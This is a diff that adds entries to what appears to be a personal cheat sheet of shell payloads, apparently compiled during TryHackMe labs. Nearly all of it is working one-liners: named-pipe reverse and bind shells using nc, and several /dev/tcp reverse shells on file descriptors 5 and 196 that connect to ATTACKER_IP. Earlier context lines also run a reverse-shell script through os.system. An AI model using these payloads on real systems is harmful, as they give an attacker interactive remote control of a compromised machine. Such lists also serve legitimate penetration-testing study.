@@ -61,3 +61,36 @@ os.system("touch /tmp/testfile")
 os.system("bash /tmp/revsh.sh")
 ```
 
+---
+
+Revsh using named pipes (connecting from target machine)
+```sh
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+```
+
+Bind shell using named pipes (listening on target machine)
+```sh
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+connect with
+```sh
+nc -nv TARGET_IP 8080
+```
+
+---
+
+Read Line Rev shell (creates file descriptor)
+```sh
+5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
+```
+
+Rev shell with File descriptor 196
+```sh
+target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
+```
+
+Rev shell with File descriptor 5
+```sh
+target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
